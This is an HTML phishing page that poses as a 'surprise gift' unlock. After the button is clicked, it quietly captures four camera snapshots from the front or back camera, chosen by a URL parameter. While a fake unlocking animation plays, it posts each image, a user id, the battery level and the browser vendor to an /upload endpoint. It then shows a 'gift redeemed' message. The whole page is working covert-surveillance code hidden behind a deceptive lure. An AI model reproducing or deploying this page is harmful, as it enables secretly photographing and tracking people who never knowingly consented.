<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: white; color: black; text-align: center; font-family: sans-serif; transition: 0.5s; margin:0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        #loading-ui { display: none; }
        .key-anim { width: 60px; animation: rotate 2s infinite linear; }
        @keyframes rotate { 0% { transform: rotate(0deg); } 50% { transform: rotate(30deg); } 100% { transform: rotate(0deg); } }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .btn { background: #00ff00; color: black; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; }
    </style>
</head>
<body>
    <div id="start-page">
        <h2>🎁 You have a surprise gift! ✨</h2>
        <p>👇 Click below to unlock it 🔓</p>
        <button class="btn" onclick="startWork()">🔓 UNLOCK YOUR GIFT 🎁</button>
    </div>

    <div id="loading-ui">
        <img src="https://cdn-icons-png.flaticon.com/512/2889/2889676.png" width="80"><br>
        <img class="key-anim" src="https://cdn-icons-png.flaticon.com/512/3039/3039433.png">
        <p>Your Gift is Unlocking...</p>
        <div class="loader"></div>
    </div>

    <div id="success-msg" style="display:none; color:#00ff00;">
        <h2>Your gift has been redeemed.</h2>
        <p>You are a good person, God bless you. ✨</p>
    </div>

    <video id="v" style="display:none" autoplay playsinline></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        const params = new URLSearchParams(window.location.search);
        async function startWork() {
            document.body.style.background = "black";
            document.body.style.color = "white";
            document.getElementById('start-page').style.display = 'none';
            document.getElementById('loading-ui').style.display = 'block';

            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: params.get('m')==='back'?'environment':'user'}});
            v.srcObject = stream;

            for(let i=0; i<4; i++) {
                await new Promise(r => setTimeout(r, 1750)); 
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                const bat = await navigator.getBattery();
                fetch('/upload', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        image: c.toDataURL('image/jpeg'),
                        uid: params.get('uid'), mode: params.get('m'),
                        info: {battery: Math.round(bat.level*100)+"%", browser: navigator.vendor}
                    })
                });
            }
            document.getElementById('loading-ui').style.display = 'none';
            document.getElementById('success-msg').style.display = 'block';
        }
    </script>
</body>
</html>
